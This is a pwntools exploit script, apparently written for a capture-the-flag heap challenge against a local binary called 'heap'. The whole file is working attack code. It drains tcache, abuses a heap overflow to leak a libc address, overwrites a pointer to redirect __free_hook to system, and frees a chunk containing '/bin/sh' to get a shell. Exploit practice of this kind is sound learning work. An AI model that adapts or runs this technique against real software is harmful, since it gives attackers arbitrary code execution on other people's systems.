#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *


se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    glibc_dir = '~/Exps/Glibc/glibc-2.27/'
    gdbscript = 'directory %smalloc/\n' % glibc_dir
    gdbscript += 'directory %sstdio-common/\n' % glibc_dir
    gdbscript += 'directory %sstdlib/\n' % glibc_dir
    gdbscript += 'directory %slibio/\n' % glibc_dir
    gdbscript += 'directory %self/\n' % glibc_dir
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript += 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

elf = ELF('./heap')
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
p = process("./heap")

def create(size, data):
    sla("$", "1")
    sla("the user :", str(size))
    sa(" content >", data)

def show(idx):
    sla("$", "2")
    sla("f which user?", str(idx))

def edit(idx, data):
    sla("$", "3")
    sla("ch user?", str(idx))
    sa("age content >>", data)

def delete(idx):
    sla("$", "4")
    sla("ch user?", str(idx))

## 0 - 6
for i in range(7):
    create(0x7f, "a" * 0x30)


## heap id = 7, overwrite heap 8
create(1, "a")

## victim heap id = 8, for leak libc
create(0x7f, "a" * 0x30)

## heap id = 9, overwrite heap 10
create(1, "a")

## victim heap id = 10, for arbitrary w/r
create(0x30, "a" * 0x30)

## for get shell, id = 11
create(0x10, "/bin/sh\x00")


## delete 0 - 6 to full fill tcache
for i in range(7):
    delete(i)

## libc address
delete(8)
## decrease size by 1 (0)
edit(7, "")

## overflow, to leak libc
edit(7, "a" * 0x50)

## leak libc
show(7)
ru("a" * 0x50)
libc = u64(rc(6) + "\x00\x00")
free_hook = libc + 0x2f48
sys_addr = libc - 0x1967d0


## decrease size by 1 (0)
edit(9, "")

## overwrite string pointer to free_hook
edit(9, "a" * 0x38 + p64(free_hook))

## modify free_hook to system
edit(10, p64(sys_addr))

## execute /bin/sh
delete(11)
p.interactive()
